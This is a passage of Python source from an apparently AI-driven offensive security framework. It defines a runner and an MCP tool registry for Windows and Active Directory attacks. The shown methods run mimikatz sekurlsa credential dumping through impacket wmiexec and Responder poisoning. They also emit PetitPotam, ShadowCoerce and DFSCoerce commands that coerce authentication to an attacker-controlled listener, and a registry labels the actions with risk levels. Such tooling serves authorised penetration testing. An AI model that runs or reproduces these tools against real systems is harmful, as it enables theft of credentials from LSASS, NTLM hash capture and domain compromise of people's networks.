                         error=res.get("error") or "")

    def _mimikatz_via_impacket(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Compose post_exploit_ext.mimikatz_sekurlsa. Runs
        ``wmiexec`` to invoke mimikatz remotely; degrades cleanly.
        Real subprocess; never fabricates a cleartext password or
        an NTLM hash."""
        started = time.time()
        st = _step("mimikatz_via_impacket")
        try:
            from core.post_exploit.runner_ext import run_attack as _px
        except Exception as e:  # noqa: BLE001
            return _finalize(st, started, ok=False,
                             error=f"post_exploit_ext not importable: {e}")
        target = (args or {}).get("target", "") or ""
        if not target:
            return _finalize(st, started, ok=False,
                             error="mimikatz_via_impacket: target required")
        composed_args = dict(args or {})
        composed_args["target"] = target
        res = _px(method="mimikatz_sekurlsa", args=composed_args)
        return _finalize(st, started,
                         ok=bool(res.get("ok")),
                         data=res.get("data"),
                         error=res.get("error") or "")

    def _responder_poison(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Compose post_exploit_ext.responder_capture. Real responder
        run; degrades on missing interface. Never fabricates a
        captured NTLMv2 hash."""
        started = time.time()
        st = _step("responder_poison")
        try:
            from core.post_exploit.runner_ext import run_attack as _px
        except Exception as e:  # noqa: BLE001
            return _finalize(st, started, ok=False,
                             error=f"post_exploit_ext not importable: {e}")
        iface = (args or {}).get("interface", "") or ""
        if not iface:
            return _finalize(st, started, ok=False,
                             error="responder_poison: interface required")
        composed_args = dict(args or {})
        composed_args["interface"] = iface
        res = _px(method="responder_capture", args=composed_args)
        return _finalize(st, started,
                         ok=bool(res.get("ok")),
                         data=res.get("data"),
                         error=res.get("error") or "")

    def _PetitPotam_coerce(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Emit (not run) the PetitPotam coerce-auth command line.
        The operator starts the actual PoC in a separate gated
        step. Degrades on missing target/attacker-listener.
        Real tool path is ``toolboxes/microsoft/PetitPotam``; this
        method only validates inputs and produces the command."""
        started = time.time()
        st = _step("PetitPotam_coerce")
        target = (args or {}).get("target", "") or ""
        listener = (args or {}).get("listener", "") or ""
        if not target or not listener:
            return _finalize(st, started, ok=False,
                             error="PetitPotam_coerce: target and listener required")
        # Build the python3 path to the cloned PetitPotam PoC.
        script = ("toolboxes/microsoft/PetitPotam/PetitPotam.py")
        cmd = [
            "python3", script,
            "-d", target,
            "-u", "",  # user/pipe/pipe are empty by default
            "-p", "",
            listener, target,
        ]
        # Validate the listener is a real address (not a shell meta).
        if any(c in listener for c in (";", "&", "|", "`", "$",
                                        " ", "\n", "\r", "\t")):
            return _finalize(st, started, ok=False,
                             error="PetitPotam_coerce: listener has shell meta")
        return _finalize(st, started, ok=True, data={
            "command": cmd,
            "script_path": script,
            "target": target,
            "listener": listener,
            "note": ("command EMITTED, not run. Operator starts the "
                     "PoC in a separate gated step. The PoC source "
                     "lives at toolboxes/microsoft/PetitPotam/."),
        }, error="")

    def _ShadowCoerce_or_DFSCoerce(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Emit (not run) the ShadowCoerce / DFSCoerce command line.
        Operator picks which PoC at run time; the method emits
        both candidate commands and lets the operator pick."""
        started = time.time()
        st = _step("ShadowCoerce_or_DFSCoerce")
        target = (args or {}).get("target", "") or ""
        listener = (args or {}).get("listener", "") or ""
        if not target or not listener:
            return _finalize(st, started, ok=False,
                             error="ShadowCoerce_or_DFSCoerce: target and listener required")
        if any(c in listener for c in (";", "&", "|", "`", "$",
                                        " ", "\n", "\r", "\t")):
            return _finalize(st, started, ok=False,
                             error="ShadowCoerce_or_DFSCoerce: listener has shell meta")
        return _finalize(st, started, ok=True, data={
            "candidates": [
                {
                    "tool": "ShadowCoerce",
                    "command": [
                        "python3",
                        "toolboxes/microsoft/ShadowCoerce/ShadowCoerce.py",
                        "-d", target,
                        "-u", "", "-p", "",
                        listener, target,
                    ],
                    "protocol": "MS-FSRVP",
                },
                {
                    "tool": "DFSCoerce",
                    "command": [
                        "python3",
                        "toolboxes/microsoft/DFSCoerce/DFSCoerce.py",
                        "-d", target,
                        "-u", "", "-p", "",
                        listener, target,
                    ],
                    "protocol": "MS-DFSNM",
                },
            ],
            "target": target,
            "listener": listener,
            "note": ("commands EMITTED, not run. Operator starts the "
                     "PoC in a separate gated step. Choose one; the "
                     "MS-FSRVP and MS-DFSNM coerce chains overlap on "
                     "most modern Windows hosts."),
        }, error="")

    # ------------------------------------------------------------------
    def run_attack(self, method: str) -> Dict[str, Any]:
        """Run a single Microsoft method by name. Never raises. The
        per-step ACCEPT/CANCEL gate already fired in
        :meth:`_walk_ai_step` (single-gate invariant)."""
        if method not in self.MICROSOFT_METHODS:
            return {
                "name": method, "ok": False,
                "error": f"unknown method {method!r}; one of {list(self.MICROSOFT_METHODS)}",
                "data": None, "duration_s": 0.0,
            }
        impl = getattr(self, f"_{method}", None)
        if impl is None:
            return {
                "name": method, "ok": False,
                "error": f"method {method!r} not implemented",
                "data": None, "duration_s": 0.0,
            }
        return impl(self._args or {})

    def __init__(self, args: Optional[Dict[str, Any]] = None) -> None:
        self._args = args or {}


# ---------------------------------------------------------------------------
# Module-level registry (mirrors the existing patterns)
# ---------------------------------------------------------------------------
MICROSOFT_METHODS: Tuple[str, ...] = MicrosoftRunner.MICROSOFT_METHODS


def _build_registry() -> List[Dict[str, Any]]:
    """Build the MCP-tool registry. Mirrors the per-method schema
    + risk_level pattern used by ``RECONS`` / ``POST_EXPLOIT_EXT_ATTACKS``
    / ``BLE_PROBES``."""
    out: List[Dict[str, Any]] = []
    for m in MicrosoftRunner.MICROSOFT_METHODS:
        spec = {
            "method": m,
            "name": f"microsoft_attack_{m}",
            "description": (
                f"Microsoft attack-surface method: {m}. See "
                "core.microsoft.runner docstring for the family "
                "layout. Real subprocess / parse / pure logic; "
                "degrades cleanly when a tool is absent or input "
                "is malformed. Never fabricates a CVE id, a "
                "cracked PSK, a cleartext credential, an NTLM "
                "hash, a Kerberos ticket, or an AD CS ESC verdict "
                "without ground truth."),
            "input_schema": {"type": "object", "properties": {}},
            "examples": [f"microsoft_attack(method={m!r}, ...)"],
            "risk_level": "read",  # all 8 read methods are READ
            "requires_root": False,
        }
        if m == "nmap_smb_rpc_winrm_discovery":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "target": {"type": "string"},
                    "ports": {"type": "array",
                              "items": {"type": "integer"}},
                    "timeout_s": {"type": "integer"}},
                "required": ["target"]}
            spec["description"] = (
                "nmap -sV -Pn over the canonical Windows port set "
                "(SMB / RPC / WinRM / RDP / Kerberos / LDAP). "
                "Read-only. Degrades on missing nmap.")
        elif m == "impacket_lookupsid_users":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "impacket_output": {"type": "string"}},
                "required": ["impacket_output"]}
            spec["description"] = (
                "Parse impacket lookupsid.py output. Pure parse; "
                "never connects to a DC.")
        elif m == "responder_discovery_sweep":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "poll_output": {"type": "string"}},
                "required": ["poll_output"]}
            spec["description"] = (
                "Parse a passive LLMNR / NBNS poll (no poison). "
                "Pure parse; never runs responder.")
        elif m == "bloodhound_collector_scheduled":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "method": {"type": "string",
                               "enum": list(_BH_METHODS)},
                    "domain": {"type": "string"},
                    "dc_ip": {"type": "string"},
                    "user": {"type": "string"},
                    "collection": {"type": "string"}},
                "required": ["domain", "dc_ip"]}
            spec["description"] = (
                "Build (and surface, not run) a BloodHound "
                "collector command line. The operator starts the "
                "actual collection in a separate gated step.")
        elif m == "certipy_adcs_find_vuln_templates":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "certipy_find_json": {"type": "string"}},
                "required": ["certipy_find_json"]}
            spec["description"] = (
                "Parse certipy find -json output and tag each "
                "template with the ESC1-ESC15 labels it matches. "
                "Pure parse.")
        elif m == "ldapsearch_ad_query":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "server": {"type": "string"},
                    "base_dn": {"type": "string"},
                    "filter": {"type": "string"},
                    "auth": {"type": "string",
                             "enum": ["anonymous", "simple",
                                      "kerberos"]},
                    "user": {"type": "string"}},
                "required": ["server", "base_dn"]}
            spec["description"] = (
                "Validate an LDAP filter and emit (not run) the "
                "ldapsearch command line. Pure logic.")
        elif m == "kerbrute_userenum_oasrep":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "users": {"type": "array",
                              "items": {"type": "string"}},
                    "domain": {"type": "string"},
                    "dc_ip": {"type": "string"}},
                "required": ["users"]}
            spec["description"] = (
                "Validate a candidate-user list and emit (not "
                "run) the kerbrute userenum + asreproast plan. "
                "Pure logic.")
        elif m == "m365_graph_tenant_recon":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "tenant": {"type": "string"},
                    "http_get": {"type": "string"}},
                "required": ["tenant"]}
            spec["description"] = (
                "Resolve M365 tenant metadata via OpenID Connect "
                "discovery (no creds, no Graph scope). Never "
                "requests privileged endpoints.")
        # Phase 2.0.M2 — intrusive surface. Composes post_exploit_ext
        # or emits coerce-auth command lines. risk=intrusive (or
        # destructive for the mimikatz wrapper).
        if m in ("impacket_secretsdump_ms", "impacket_psexec_ms",
                 "responder_poison"):
            spec["risk_level"] = "intrusive"
        elif m == "mimikatz_via_impacket":
            spec["risk_level"] = "destructive"
            spec["description"] = (
                "mimikatz sekurlsa::logonpasswords via impacket "
                "wmiexec. Destructive: extracts live credential "
                "material from LSASS. NEVER fabricates a cleartext "
                "password, an NTLM hash, or a Kerberos ticket.")
        elif m == "PetitPotam_coerce":
            spec["risk_level"] = "intrusive"
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "target": {"type": "string"},
                    "listener": {"type": "string"}},
                "required": ["target", "listener"]}
            spec["description"] = (
                "Emit (not run) the PetitPotam coerce-auth command "
                "line via MS-EFSRPC. The PoC source is at "
                "toolboxes/microsoft/PetitPotam/. Operator starts "
                "the actual PoC in a separate gated step.")
        elif m == "ShadowCoerce_or_DFSCoerce":
            spec["risk_level"] = "intrusive"
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "target": {"type": "string"},
                    "listener": {"type": "string"}},
                "required": ["target", "listener"]}
            spec["description"] = (
                "Emit (not run) the ShadowCoerce (MS-FSRVP) and "
                "DFSCoerce (MS-DFSNM) coerce-auth command lines. "
                "Operator picks one in a separate gated step. "
                "Both PoC sources are in toolboxes/microsoft/.")
        elif m == "impacket_secretsdump_ms":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "target": {"type": "string"},
                    "user": {"type": "string"},
                    "cred": {"type": "string"}},
                "required": ["target", "user"]}
        elif m == "impacket_psexec_ms":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "target": {"type": "string"},
                    "user": {"type": "string"},
                    "cred": {"type": "string"}},
                "required": ["target"]}
        elif m == "mimikatz_via_impacket":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "target": {"type": "string"},
                    "user": {"type": "string"},
                    "cred": {"type": "string"}},
                "required": ["target"]}
        elif m == "responder_poison":
            spec["input_schema"] = {
                "type": "object",
                "properties": {
                    "interface": {"type": "string"}},
                "required": ["interface"]}
        out.append(spec)
    return out


MICROSOFT_ATTACKS: List[Dict[str, Any]] = _build_registry()


def run_attack(method: str, args: Optional[Dict[str, Any]] = None,
               **_: Any) -> Dict[str, Any]:
    """Module-level single-attack entrypoint. Used by the
    orchestrator's ``microsoft_attack`` dispatch and the MCP
    wrappers. Never raises."""
    try:
        runner = MicrosoftRunner(args=args)
        return runner.run_attack(method)
    except Exception as e:  # noqa: BLE001
        return {"name": method, "ok": False, "error": str(e),
                "data": None, "duration_s": 0.0}
